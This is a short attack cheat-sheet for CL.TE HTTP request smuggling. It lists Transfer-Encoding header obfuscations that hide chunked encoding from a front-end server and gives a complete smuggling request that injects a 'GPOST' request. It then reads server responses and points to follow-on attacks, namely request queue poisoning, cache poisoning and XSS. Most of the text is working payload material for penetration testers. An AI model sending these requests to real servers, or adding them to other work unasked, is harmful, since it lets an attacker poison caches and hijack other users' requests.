# CL.TE Desync Attacks

Front-end uses Content-Length while Back-end uses Transfer-Encoding.

## Classic CL.TE >>> RQP
- Hide Transfer-Encoding from front-end
  - H-V discrepancy exploitation
  - Leading space: ` Transfer-Encoding: chunked`
  - Obfuscation variants
    - `Transfer-Encoding: xchunked`
    - `Transfer-Encoding : chunked`
    - `Transfer-Encoding: chunked `
    - `Transfer-Encoding:[tab]chunked`
    - `X: X[\n]Transfer-Encoding: chunked`

## Test Request
```
POST / HTTP/1.1
Host: example.com
Content-Length: 4
 Transfer-Encoding: chunked

5c
GPOST / HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 15

x=1
0

```

## Expected Results
- 200 OK with normal page >>> No desync
  - Front-end blocked request
  - Back-end ignored TE header
- 404 Not Found for /gpost >>> Desync successful
  - Back-end processed GPOST as separate request
  - Next step >>> RQP || Cache poison || XSS gadget
- Timeout then 400 Bad Request >>> Partial desync
  - Request parsing failed
  - Try different obfuscation variant
